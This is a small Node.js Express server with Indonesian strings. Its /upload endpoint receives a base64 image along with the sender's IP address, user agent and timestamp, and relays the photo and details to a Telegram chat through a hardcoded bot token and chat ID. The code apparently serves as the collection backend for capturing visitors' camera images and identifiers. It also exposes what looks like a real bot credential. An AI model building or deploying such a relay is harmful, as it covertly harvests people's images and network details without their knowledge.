const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = '7707166709:AAHfwZ_lWHqVtYROADuojWlNRt-b-IN-gJE';
const TELEGRAM_CHAT_ID = '7233342888';

app.post('/upload', async (req, res) => {
  const { image, userAgent, ip, timestamp } = req.body;

  const caption = `Gambar dari user\nIP: ${ip}\nUA: ${userAgent}\nWaktu: ${timestamp}`;

  const imageBuffer = Buffer.from(image.split(',')[1], 'base64');

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('caption', caption);
  formData.append('photo', imageBuffer, 'photo.jpg');

  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  });

  res.send({ status: 'success' });
});

app.listen(3000, () => console.log('Server jalan di port 3000'));
